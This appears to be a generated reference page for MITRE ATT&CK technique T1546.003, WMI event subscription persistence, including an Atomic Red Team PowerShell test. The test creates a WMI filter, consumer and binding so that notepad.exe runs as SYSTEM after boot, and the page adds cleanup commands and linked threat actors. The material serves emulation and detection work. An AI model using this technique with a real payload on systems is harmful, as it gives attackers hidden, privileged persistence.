
# Windows Management Instrumentation Event Subscription

## Description

### MITRE Description

> Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015)

Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)

WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1546/003

## Potential Commands

```
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

## Commands Dataset

```
[{'command': "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n"
             "                EventNameSpace='root\\CimV2';\n"
             '                QueryLanguage="WQL";\n'
             '                Query="SELECT * FROM __InstanceModificationEvent '
             'WITHIN 60 WHERE TargetInstance ISA '
             "'Win32_PerfFormattedData_PerfOS_System' AND "
             'TargetInstance.SystemUpTime >= 240 AND '
             'TargetInstance.SystemUpTime < 325"};\n'
             '$Filter=New-CimInstance -Namespace root/subscription -ClassName '
             '__EventFilter -Property $FilterArgs\n'
             '\n'
             "$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';\n"
             '                '
             'CommandLineTemplate="$($Env:SystemRoot)\\System32\\notepad.exe";}\n'
             '$Consumer=New-CimInstance -Namespace root/subscription '
             '-ClassName CommandLineEventConsumer -Property $ConsumerArgs\n'
             '\n'
             '$FilterToConsumerArgs = @{\n'
             'Filter = [Ref] $Filter;\n'
             'Consumer = [Ref] $Consumer;\n'
             '}\n'
             '$FilterToConsumerBinding = New-CimInstance -Namespace '
             'root/subscription -ClassName __FilterToConsumerBinding -Property '
             '$FilterToConsumerArgs\n',
  'name': None,
  'source': 'atomics/T1546.003/T1546.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Event Triggered Execution: Windows Management Instrumentation Event Subscription': {'atomic_tests': [{'auto_generated_guid': '3c64f177-28e2-49eb-a799-d767b24dd1e0',
                                                                                                                                'description': 'Run '
                                                                                                                                               'from '
                                                                                                                                               'an '
                                                                                                                                               'administrator '
                                                                                                                                               'powershell '
                                                                                                                                               'window. '
                                                                                                                                               'After '
                                                                                                                                               'running, '
                                                                                                                                               'reboot '
                                                                                                                                               'the '
                                                                                                                                               'victim '
                                                                                                                                               'machine.\n'
                                                                                                                                               'After '
                                                                                                                                               'it '
                                                                                                                                               'has '
                                                                                                                                               'been '
                                                                                                                                               'online '
                                                                                                                                               'for '
                                                                                                                                               '4 '
                                                                                                                                               'minutes '
                                                                                                                                               'you '
                                                                                                                                               'should '
                                                                                                                                               'see '
                                                                                                                                               'notepad.exe '
                                                                                                                                               'running '
                                                                                                                                               'as '
                                                                                                                                               'SYSTEM.\n'
                                                                                                                                               '\n'
                                                                                                                                               'Code '
                                                                                                                                               'references\n'
                                                                                                                                               '\n'
                                                                                                                                               'https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n'
                                                                                                                                               '\n'
                                                                                                                                               'https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n',
                                                                                                                                'executor': {'cleanup_command': '$EventConsumerToCleanup '
                                                                                                                                                                '= '
                                                                                                                                                                'Get-WmiObject '
                                                                                                                                                                '-Namespace '
                                                                                                                                                                'root/subscription '
                                                                                                                                                                '-Class '
                                                                                                                                                                'CommandLineEventConsumer '
                                                                                                                                                                '-Filter '
                                                                                                                                                                '"Name '
                                                                                                                                                                '= '
                                                                                                                                                                '\'AtomicRedTeam-WMIPersistence-Example\'"\n'
                                                                                                                                                                '$EventFilterToCleanup '
                                                                                                                                                                '= '
                                                                                                                                                                'Get-WmiObject '
                                                                                                                                                                '-Namespace '
                                                                                                                                                                'root/subscription '
                                                                                                                                                                '-Class '
                                                                                                                                                                '__EventFilter '
                                                                                                                                                                '-Filter '
                                                                                                                                                                '"Name '
                                                                                                                                                                '= '
                                                                                                                                                                '\'AtomicRedTeam-WMIPersistence-Example\'"\n'
                                                                                                                                                                '$FilterConsumerBindingToCleanup '
                                                                                                                                                                '= '
                                                                                                                                                                'Get-WmiObject '
                                                                                                                                                                '-Namespace '
                                                                                                                                                                'root/subscription '
                                                                                                                                                                '-Query '
                                                                                                                                                                '"REFERENCES '
                                                                                                                                                                'OF '
                                                                                                                                                                '{$($EventConsumerToCleanup.__RELPATH)} '
                                                                                                                                                                'WHERE '
                                                                                                                                                                'ResultClass '
                                                                                                                                                                '= '
                                                                                                                                                                '__FilterToConsumerBinding" '
                                                                                                                                                                '-ErrorAction '
                                                                                                                                                                'SilentlyContinue\n'
                                                                                                                                                                '$FilterConsumerBindingToCleanup '
                                                                                                                                                                '| '
                                                                                                                                                                'Remove-WmiObject\n'
                                                                                                                                                                '$EventConsumerToCleanup '
                                                                                                                                                                '| '
                                                                                                                                                                'Remove-WmiObject\n'
                                                                                                                                                                '$EventFilterToCleanup '
                                                                                                                                                                '| '
                                                                                                                                                                'Remove-WmiObject\n',
                                                                                                                                             'command': '$FilterArgs '
                                                                                                                                                        '= '
                                                                                                                                                        "@{name='AtomicRedTeam-WMIPersistence-Example';\n"
                                                                                                                                                        '                '
                                                                                                                                                        "EventNameSpace='root\\CimV2';\n"
                                                                                                                                                        '                '
                                                                                                                                                        'QueryLanguage="WQL";\n'
                                                                                                                                                        '                '
                                                                                                                                                        'Query="SELECT '
                                                                                                                                                        '* '
                                                                                                                                                        'FROM '
                                                                                                                                                        '__InstanceModificationEvent '
                                                                                                                                                        'WITHIN '
                                                                                                                                                        '60 '
                                                                                                                                                        'WHERE '
                                                                                                                                                        'TargetInstance '
                                                                                                                                                        'ISA '
                                                                                                                                                        "'Win32_PerfFormattedData_PerfOS_System' "
                                                                                                                                                        'AND '
                                                                                                                                                        'TargetInstance.SystemUpTime '
                                                                                                                                                        '>= '
                                                                                                                                                        '240 '
                                                                                                                                                        'AND '
                                                                                                                                                        'TargetInstance.SystemUpTime '
                                                                                                                                                        '< '
                                                                                                                                                        '325"};\n'
                                                                                                                                                        '$Filter=New-CimInstance '
                                                                                                                                                        '-Namespace '
                                                                                                                                                        'root/subscription '
                                                                                                                                                        '-ClassName '
                                                                                                                                                        '__EventFilter '
                                                                                                                                                        '-Property '
                                                                                                                                                        '$FilterArgs\n'
                                                                                                                                                        '\n'
                                                                                                                                                        '$ConsumerArgs '
                                                                                                                                                        '= '
                                                                                                                                                        "@{name='AtomicRedTeam-WMIPersistence-Example';\n"
                                                                                                                                                        '                '
                                                                                                                                                        'CommandLineTemplate="$($Env:SystemRoot)\\System32\\notepad.exe";}\n'
                                                                                                                                                        '$Consumer=New-CimInstance '
                                                                                                                                                        '-Namespace '
                                                                                                                                                        'root/subscription '
                                                                                                                                                        '-ClassName '
                                                                                                                                                        'CommandLineEventConsumer '
                                                                                                                                                        '-Property '
                                                                                                                                                        '$ConsumerArgs\n'
                                                                                                                                                        '\n'
                                                                                                                                                        '$FilterToConsumerArgs '
                                                                                                                                                        '= '
                                                                                                                                                        '@{\n'
                                                                                                                                                        'Filter '
                                                                                                                                                        '= '
                                                                                                                                                        '[Ref] '
                                                                                                                                                        '$Filter;\n'
                                                                                                                                                        'Consumer '
                                                                                                                                                        '= '
                                                                                                                                                        '[Ref] '
                                                                                                                                                        '$Consumer;\n'
                                                                                                                                                        '}\n'
                                                                                                                                                        '$FilterToConsumerBinding '
                                                                                                                                                        '= '
                                                                                                                                                        'New-CimInstance '
                                                                                                                                                        '-Namespace '
                                                                                                                                                        'root/subscription '
                                                                                                                                                        '-ClassName '
                                                                                                                                                        '__FilterToConsumerBinding '
                                                                                                                                                        '-Property '
                                                                                                                                                        '$FilterToConsumerArgs\n',
                                                                                                                                             'elevation_required': True,
                                                                                                                                             'name': 'powershell'},
                                                                                                                                'name': 'Persistence '
                                                                                                                                        'via '
                                                                                                                                        'WMI '
                                                                                                                                        'Event '
                                                                                                                                        'Subscription',
                                                                                                                                'supported_platforms': ['windows']}],
                                                                                                              'attack_technique': 'T1546.003',
                                                                                                              'display_name': 'Event '
                                                                                                                              'Triggered '
                                                                                                                              'Execution: '
                                                                                                                              'Windows '
                                                                                                                              'Management '
                                                                                                                              'Instrumentation '
                                                                                                                              'Event '
                                                                                                                              'Subscription'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations


* [User Account Management](../mitigations/User-Account-Management.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    

# Actors


* [APT29](../actors/APT29.md)

* [Leviathan](../actors/Leviathan.md)
    
* [Turla](../actors/Turla.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
* [APT33](../actors/APT33.md)
    
